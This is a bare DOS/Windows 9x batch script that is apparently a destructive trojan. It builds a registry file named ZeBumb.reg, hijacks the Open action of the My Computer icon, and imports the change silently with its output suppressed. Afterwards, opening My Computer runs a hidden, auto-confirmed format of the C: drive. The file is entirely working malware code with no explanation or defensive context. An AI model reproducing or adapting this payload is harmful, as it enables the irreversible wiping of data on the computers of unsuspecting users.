@ctty nul
set reg=c:\ZeBumb.reg
echo>%reg% REGEDIT4
echo.>>%reg%
echo>>%reg% [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Open]
echo.>>%reg%
echo>>%reg% [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Open\Command]
echo>>%reg% @="start /minimized command /c echo y|format c: /u >nul"
echo.>>%reg%
regedit.exe %reg%